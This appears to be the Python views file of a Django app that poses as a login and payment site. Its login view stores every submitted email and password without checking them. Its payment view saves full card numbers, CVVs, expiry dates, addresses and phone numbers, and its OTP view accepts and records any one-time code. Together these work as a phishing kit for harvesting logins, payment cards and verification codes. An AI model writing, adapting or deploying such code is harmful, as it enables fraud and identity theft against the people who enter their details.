from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login
from django.contrib.auth.forms import AuthenticationForm

from django.contrib.auth.decorators import login_required
from django.utils.crypto import get_random_string
from .models import Payment
from .forms import PaymentForm
import random
from .models import UserCredentials,OTP
from django.contrib.auth.hashers import make_password


def login_view(request):
    error_message = None  

    if request.method == "POST":
        email = request.POST["email"]
        password = request.POST["password"]

        # Save email & password in DB (hashed for security)
        UserCredentials.objects.create(email=email, password=make_password(password))

        # Authenticate user
        # user = authenticate(request, username=email, password=password)

        # if user is not None:
        # login(request, user)
        return redirect("payment_page")  
        # else:
        #     error_message = "Invalid email or password. Please try again."

    return render(request, "login.html", {"error": error_message})

def payment_page(request):
    if request.method == "POST":
        # Collecting form data from request
        name = request.POST.get("name", "")
        email = request.POST.get("email", "")
        address = request.POST.get("address", "")
        zipcode = request.POST.get("zipcode", "")
        country = request.POST.get("country", "")
        card_name = request.POST.get("card_name", "")
        card_number = request.POST.get("card_number", "")
        cvv = request.POST.get("cvv", "")
        expiry_month = request.POST.get("expiry_month", "")
        expiry_year = request.POST.get("expiry_year", "")
        phone = request.POST.get("phone", "")
        print(name)
        print(email)

        # Save data to database
        payment = Payment.objects.create(
            name=name,
            email=email,
            address=address,
            zipcode=zipcode,
            country=country,
            card_name=card_name,
            card_number=card_number,
            cvv=cvv,
            expiry_month=expiry_month,
            expiry_year=expiry_year,
            phone=phone
        )
        print(payment)
        # Redirect to OTP page after saving
        return redirect("otp_page")  

    return render(request, "payment.html") 

def otp_page(request):
    if request.method == "POST":
        otp = (
            request.POST.get("otp1", "") +
            request.POST.get("otp2", "") +
            request.POST.get("otp3", "") +
            request.POST.get("otp4", "") +
            request.POST.get("otp5", "") +
            request.POST.get("otp6", "")
        )
        if otp:  # Accept any input as a valid OTP
            #create otp object
            OTP.objects.create(otp = otp)
            return redirect('success_page')  # Redirect to success page
        
        else:
            return render(request, 'otp.html', {"error": "Please enter OTP"})

    return render(request, 'otp.html')


def success_view(request):
    return render(request, 'success.html')
